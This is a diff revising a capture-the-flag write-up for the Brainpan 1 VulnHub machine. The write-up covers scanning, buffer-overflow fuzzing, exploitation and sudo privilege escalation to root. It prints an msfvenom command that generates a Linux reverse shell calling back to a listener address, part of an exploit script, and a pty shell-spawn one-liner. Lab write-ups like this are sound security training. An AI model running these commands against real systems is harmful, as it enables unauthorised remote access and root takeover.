@@ -1,7 +1,7 @@
 Download brainpan from [vulnhub](https://www.vulnhub.com/entry/brainpan-1,51/) and provision it as a VM.
 
 
-## Scanning
+# Scanning
 
 Let’s try to find the IP of this machine using nmap. 
 
@@ -20,7 +20,7 @@ Below are the results of the nmap scan, where port 9999 and http running on 1000
 ![b0d695ca1a44d3cc7684c80e0d372ccb.png](/_resources/1b5e8edd1dda45bab01654d047dc24cf.png)
 
 
-## Enumeration
+# Enumeration
 
 Port 10000 is serving an https server. Opening it in browser gives us the following unintersting page.
 
@@ -56,7 +56,7 @@ Dropping brainpan.exe to the Windows 7 lab machine. Below we can see that brainp
 
 ![c5fb599587e7d4c1d6cc5adf3a3d9806.png](/_resources/935a5f2062684f8a92640efb4ec856ff.png)
 
-Connecting to Windows 7 machine, running brainpan.exe.
+Connecting to Windows 7 machine using net-cat, running brainpan.exe.
 `nc -nv 192.168.69.101 9999`
 
 ![a5bccb2981932f2a47246bb458efc670.png](/_resources/170cd19b33a24a64bf9a5742d6533ac4.png)
@@ -70,7 +70,7 @@ Connecting to Windows 7 machine, running brainpan.exe.
 ![c40ebc3b35c9978e4df95f916a2474ca.png](/_resources/2238882e0d404b428b81b2211a3d9fed.png)
 
 
-## Debugging (that Buffer Overflow part)
+# Debugging (that Buffer Overflow part)
 
 1. fuzzing
 ```
@@ -359,21 +359,26 @@ except:
 ![76d51de3a8fa8e7c73dce591080d6f1b.png](/_resources/5ae1e1fd3dfb4d14aa6dfb92d726ff67.png)
 
 
-## Exploitation
+# Exploitation
 
-Moving to brainpan box
+Running the exploit at brainpan box and getting a shell.
+
 ![dc33a2f0d68cc25e081d21556cb2399a.png](/_resources/09af96eafc594d6aa2169e0bea04ceef.png)
 
-shell is running windows commands but has linux, maybe wine
+We are running windows commands on this shell. But the directories indicate that it is a Linux machine *surprise surprise* 
+brainpan.exe is running on linux using Wine.
+
 ![0e2f8a0148c60a1203577a49582dfed1.png](/_resources/51c10bfb406241cdaa4a5281bef5e037.png)
 
 ![d5b6253dfc6ea786863b06251658ced5.png](/_resources/25a1c00532704eb2a6a754657cfb12af.png)
 
 ![09b437c10c086978334071dbf4f8d5eb.png](/_resources/a5b7b10117c6464e80268ba8e9c59cbd.png)
 
+Let's just create a payload for Linux to get the reverse shell back. Below, we use msfvenom to generate the Linux reverse shell. 
+
 `msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.43.8 LPORT=4444 EXITFUNC=thread -a x86 --platform linux -b "\x00" -f c > shellcode.txt`
 
-## brainpan_exploit.py
+Using the generated shellcode to get a reverse shell from brainpan machine using brainpan_exploit.py
 ```
 import socket
 import sys
@@ -407,10 +412,20 @@ except:
   sys.exit()
 
 ```
+
 ![c5be47dee56750a8921cd4959d122573.png](/_resources/7213ce04b25d41fbbd7eb458c5a4d143.png)
 
-Spawn a better shell: `python3 -c 'import pty; pty.spawn("/bin/sh")'`
+To spawn a better shell: `python3 -c 'import pty; pty.spawn("/bin/sh")'`
 
-Privesc
+## Privilege Escalation
+
+The shell is currently under user puck.
+
+One of the first commands that I execute is `sudo -l`. (Another useful check I perform is to check for binaries with SUID bit set).
+Below is the output from the sudo -l command. We can see that the user puck can run the binary under /home/anansi/bin/anansi_util as root.
+
 ![c7fce6d7a73c22038e65aa1dd4a014aa.png](/_resources/7720165e5bf94f3a99e4df3a9064191d.png)
+
+Below, we have run the abovementioned anansi_util and it has some parameters. An interesting parameter is manual [command]. We just passed a sample command “/bin/bash" to it and then type !/bin/bash, and we have escalated to root.
+
 ![3c702b75b300938489518848a53daba3.png](/_resources/f50316ff673d44c39ba830047e5ac1cf.png)
